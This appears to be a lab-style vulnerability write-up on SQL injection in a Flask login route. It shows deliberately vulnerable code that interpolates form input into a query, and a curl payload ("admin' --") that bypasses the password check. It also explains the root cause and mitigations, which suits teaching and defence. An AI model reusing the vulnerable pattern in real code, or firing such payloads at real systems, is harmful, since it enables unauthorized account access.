## Vulnerability description
The application constructs SQL queries using unsanitized user input. Because user-controlled input is directly embedded into SQL statements, an attacker can manipulate database queries to bypass authentication.

This vulnerability allows:
- Authentication bypass
- Unauthorized data access
- Potential database manipulation
- Full database compromise (depending on privileges)

## Vulnerable implementation
1. Database Initialization
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);
```
2. Vulnerable login code
```python
@app.route("/login", methods=["POST"])
def login():
	username = request.form.get("username")
	password = request.form.get("password")

	conn = sqlite3.connect("database.db")
	cursor = conn.cursor()

	query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
	cursor.execute(query)

	user = cursor.fetchone()
	conn.close()

	if user:
		return "Login successful!"
	else:
		return "Invalid credentials"
```

3. Why is it vulnerable
	User input is inserted into the SQL query, which allows the attacker to modify the query behavior

## Exploitation

1. Access login page under `POST /login`
2. Inject payload 
	`curl -X POST http://127.0.0.1:5000/login -d "username=admin' --&password="`
	This result in query to become this 
```sql
	 SELECT * FROM users 
	WHERE username = 'admin' -- ' AND password = ''
```
	Everything after `--` is treated as a comment.
	The password check is completely bypassed.
3. Result
	 `Login successful!`

## Impact
- Authentication bypass
- Unauthorized access
- Data exfiltration
- Data manipulation
- Full database compromise

## Root cause
- Direct string interpolation in SQL queries
- Lack of input validation
- Failure to use parameterized queries
- No prepared statements

## Mitigation
- ORM
- Least privilege 
	- Ensure the database user:
		- Cannot drop tables
		- Cannot modify schema
		- Has limited permissions

	

